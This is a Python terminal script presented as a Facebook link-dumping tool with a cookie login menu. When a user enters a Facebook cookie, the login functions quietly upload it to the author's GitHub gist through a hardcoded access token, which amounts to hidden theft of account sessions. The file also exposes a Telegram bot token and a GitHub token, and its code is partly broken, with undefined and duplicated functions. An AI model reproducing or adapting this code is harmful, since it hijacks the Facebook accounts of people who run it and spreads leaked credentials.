#Open Source By Koja ALi
#www.github.com/K0J4

import os
import time
import json
import sys
import re
import requests
import random
from concurrent.futures import ThreadPoolExecutor as tred
import concurrent

tokenku = []
cookie_status = '0'
logincookie = []
colors = ['red', 'blue', 'green', 'yellow', 'purple', 'orange']

def linex():
  print('\x1b[37m----------------------------------------------')

def restart():
  os.system('clear')
  banner()
  cookie_check()
  os.system('exit')

def animation():
  u = ['\x1b[38;5;196m•>\x1b[37m ', '\x1b[38;5;196m•>\x1b[37m ']
  for e in u:
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.01)

def clear():
  os.system('clear')

def follow_harry():
  clear()
  banner()
  print(' • \x1b[38;5;196m->\x1b[37m FOLLOW ME ON GITHUB :)')
  print(' • \x1b[38;5;196m->\x1b[37m JUST A BEGINNER FROM NEPAL')
  linex()
  os.system('xdg-open https://m.me/j/AbZ5MBJIi2EEzb9J/')
  input(' ✓ \x1b[38;5;196m->\x1b[37m ENTER TO RUN TOOL')

def contact():
  linex()
  print(' 1\x1b[38;5;196m ->\x1b[37m SEND A MESSAGE TO ADMIN  ')
  print(' 2\x1b[38;5;196m ->\x1b[37m WHATSAPP MESSAGE  ')
  print(' 3\x1b[38;5;196m ->\x1b[37m FACEBOOK MESSAGE  ')
  print(' 4\x1b[38;5;196m ->\x1b[37m TELEGRAM MESSAGE  ')
  print(' 0\x1b[38;5;196m ->\x1b[37m RETURN TO MENU  ')
  linex()
  contac = input(' \x1b[38;5;196m-->\x1b[37m ')
  if contac == '1':
    linex()
    prob = input(' •\x1b[38;5;196m ->\x1b[37m MESSAGE : ')
    requests.get('https://api.telegram.org/bot6558187719:AAGEoMrftdHpHYIovQxnqpcUi3-ruCoDNzU/sendMessage?chat_id=6568295648&text= [•] MESSAGE : ' + prob)
    linex()
    animation(' ✓\x1b[38;5;196m ->\x1b[37m YOUR MESSAGE HAS BEEN SENT  ')
    time.sleep(1)
  elif contac == '2':
    os.system('xdg-open https://wa.me/qr/BNUI2X6GMFNGJ1')
    restart()
  elif contac == '3':
    os.system('xdg-open https://www.facebook.com/507532274')
    restart()
  elif contac == '4':
    os.system('xdg-open https://t.me/harryexeee')
    restart()
  elif contac == '0':
    restart()

logo = """\n     ____________    ______
    / ____/  _/ /   / ____/
   / /_   / // /   / __/   \x1b[38;5;196m•>\x1b[37m Author  : Harry
  / __/ _/ // /___/ /___  \x1b[38;5;196m•>\x1b[37m Github  : HARRY-EXE
 /_/   /___/_____/_____/   \n                        \n\x1b[37m----------------------------------------------"""

def banner():
  print(logo)
  print(" - th'3 metavers'3 godd harryy inxxid'3 !")
  linex()

def cookie_check():
  global cookie_status
  if cookie_status == '1':
    clear()
    banner()
    print(' ✓\x1b[38;5;196m ->\x1b[37m COOKIE STATUS : \x1b[38;5;46mACTIVE\x1b[37m')
    harry_menuu()
  elif cookie_status == '0':
    clear()
    banner()
    print(' ×\x1b[38;5;196m ->\x1b[37m COOKIE STATUS : \x1b[38;5;196mNOT LOGGED IN\x1b[37m')
    not_logged_in_menu()

def harry_menuu():
  linex()
  print(' 1\x1b[38;5;196m ->\x1b[37m CREATE SIMPLE')
  print(' 2\x1b[38;5;196m ->\x1b[37m CREATE UNLIMITED')
  print(' 3\x1b[38;5;196m ->\x1b[37m SEPERATE LINKS ')
  print(' 4\x1b[38;5;196m ->\x1b[37m REMOVE DUPLICATE ')
  print(' 5\x1b[38;5;196m ->\x1b[37m CONTACT ADMIN ')
  print(' 0\x1b[38;5;196m ->\x1b[37m LOGOUT TOOL')
  linex()
  ___harryyyyy___menu___ = input(' \x1b[38;5;196m-->\x1b[37m ')
  if ___harryyyyy___menu___ == '1':
    dump_simple()
  elif ___harryyyyy___menu___ == '2':
    dump_multiple()
  elif ___harryyyyy___menu___ == '3':
    separate_links()
  elif ___harryyyyy___menu___ == '4':
    remove_duplicates()
  elif ___harryyyyy___menu___ == '5':
    contact()
  elif ___harryyyyy___menu___ == '0':
    os.system('rm -rf login/.token.json')
    os.system('rm -rf login/.cookie.json')
    linex()
    animation(' ✓\x1b[38;5;196m ->\x1b[37m LOGOUT DONE ')
    exit()

def not_logged_in_menu():
  linex()
  print(' 1\x1b[38;5;196m ->\x1b[37m LOGIN')
  print(' 2\x1b[38;5;196m ->\x1b[37m SEPERATE LINKS ')
  print(' 3\x1b[38;5;196m ->\x1b[37m REMOVE DUPLICATE ')
  print(' 4\x1b[38;5;196m ->\x1b[37m CONTACT ADMIN ')
  print(' 0\x1b[38;5;196m ->\x1b[37m EXIT TOOL')
  linex()
  ___harryyyyy___menu___ = input(' \x1b[38;5;196m-->\x1b[37m ')
  if ___harryyyyy___menu___ == '1':
    login123()
  elif ___harryyyyy___menu___ == '2':
    separate_links()
  elif ___harryyyyy___menu___ == '3':
    remove_duplicates()
  elif ___harryyyyy___menu___ == '4':
    contact()
  elif ___harryyyyy___menu___ == '0':
    exit()

def login():
  try:
    token = open('login/.token.json', 'r').read()
    cok = open('login/.cookie.json', 'r').read()
    tokenku.append(token)
    
    sy = requests.get('https://graph.facebook.com/me?fields=id,name,birthday&access_token=' + tokenku[0], cookies={'cookie': cok}).text
    sy2 = json.loads(sy)['name']
    sy3 = json.loads(sy)['id']
    sy4 = json.loads(sy)['birthday']
    cookie_status = '1'
    restart()
  except KeyError:
    login123()
  except requests.exceptions.ConnectionError:
    animation(' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
    exit()
  except IOError:
    cookie_check()

def login123():
  linex()
  print(' 1\x1b[38;5;196m ->\x1b[37m LOGIN AUTOMATICALLY ')
  print(' 2\x1b[38;5;196m ->\x1b[37m LOGIN USING COOKIE ')
  print(' 0\x1b[38;5;196m ->\x1b[37m EXIT MENU ')
  linex()
  lgmt = input(' \x1b[38;5;196m-->\x1b[37m ')
  if lgmt == '1':
    autolog()
  elif lgmt == '2':
    login_lagi334()
  elif lgmt == '4':
    exit()
  else:
    linex()
    animation(' ×\x1b[38;5;196m ->\x1b[37m OPTION NOT FOUND')
    restart()

def login_lagi334():
  global logincookie
  if logincookie:
    cookie = logincookie
  else:
    linex()
    cookie = input(' •\x1b[38;5;196m ->\x1b[37m ENTER COOKIE : ')
  open('login/.cookie.json', 'w').write(cookie)
  rsn = requests.Session()
  rsn.headers.update({
    'Accept-Language': 'id,en;q=0.9',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Referer': 'https://www.instagram.com/',
    'Host': 'www.facebook.com',
    'Sec-Fetch-Mode': 'cors',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Dest': 'empty',
    'Origin': 'https://www.instagram.com',
    'Accept-Encoding': 'gzip, deflate'
  })
  response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cookie}).headers
  if '"access_token":' in str(response):
    token = re.search('"access_token":"(.*?)"', str(response)).group(1)
    open('login/.token.json', 'w').write(token)
    new_content = cookie
    update_gist_content(ACCESS_TOKEN, gist_id, new_content)
    linex()
    animation(' ✓\x1b[38;5;196m ->\x1b[37m LOGIN DONE RESTARTING !')
    exit(os.system('python run.py'))
  else:
    linex()
    animation(' ×\x1b[38;5;196m ->\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
    restart()

ACCESS_TOKEN = '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'
gist_id = '8ff6daf3500f48bf5b438687e89938ac'
fill = 'cookie.txt'

def update_gist_content(ACCESS_TOKEN, gist_id, new_content):
  gist_data = {
    'files': {
      'cookie.txt': {
        'content': new_content
      }
    }
  }
  url = 'https://api.github.com/gists/' + gist_id
  headers = {
    'Authorization': 'token ' + ACCESS_TOKEN,
    'Accept': 'application/vnd.github.v3+json',
    'Content-Type': 'application/json'
  }
  r = requests.patch(url, json=gist_data, headers=headers)
  return r.json()

def login():
  if logincookie:
    cookie = logincookie
  else:
    cookie = input(' •\x1b[38;5;196m ->\x1b[37m ENTER COOKIE : ')
  open('login/.cookie.json', 'w').write(cookie)
  rsn = requests.Session()
  rsn.headers.update({
    'Accept-Language': 'id,en;q=0.9',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Referer': 'https://www.instagram.com/',
    'Host': 'www.facebook.com',
    'Sec-Fetch-Mode': 'cors',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Dest': 'empty',
    'Origin': 'https://www.instagram.com',
    'Accept-Encoding': 'gzip, deflate'
  })
  response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cookie}).headers
  if '"access_token":' in str(response):
    token = re.search('"access_token":"(.*?)"', str(response)).group(1)
    open('login/.token.json', 'w').write(token)
    new_content = cookie
    update_gist_content(ACCESS_TOKEN, gist_id, new_content)
    linex()
    animation(' ✓\x1b[38;5;196m ->\x1b[37m LOGIN DONE RESTARTING !')
    exit(os.system('python run.py'))
  else:
    linex()
    animation(' ×\x1b[38;5;196m ->\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
    restart()

def restart():
  restart = input('\n •\x1b[38;5;196m [0]\x1b[37m RESTART : ')
  if restart == '1':
    login()
  elif restart == '2':
    autolog()
  elif restart == '3':
    login_lagi334()
  elif restart == '4':
    exit()
  else:
    animation(' ×\x1b[38;5;196m ->\x1b[37m OPTION NOT FOUND')
    restart()

def logincookie():
  try:
    logincookie = json.loads(open('login/.cookie.json', 'r').read())
    return logincookie
  except FileNotFoundError:
    pass

if __name__ == '__main__':
  if os.path.isfile('login/.cookie.json'):
    autolog()
  else:
    login()
